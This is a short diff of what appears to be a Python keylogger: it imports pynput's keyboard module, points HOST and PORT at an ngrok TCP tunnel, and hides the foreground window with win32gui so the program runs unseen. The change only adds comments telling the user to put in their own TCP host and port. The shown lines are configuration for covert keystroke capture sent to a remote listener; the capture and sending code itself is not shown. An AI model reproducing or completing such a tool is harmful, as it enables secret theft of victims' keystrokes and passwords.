@@ -3,8 +3,8 @@ from pynput import keyboard
 import win32gui
 import win32con
 
-HOST = '0.tcp.eu.ngrok.io'
-PORT = 17212
+HOST = '0.tcp.eu.ngrok.io' # Your tcp host
+PORT = 17212 # Your tcp open port
 
 hwnd = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
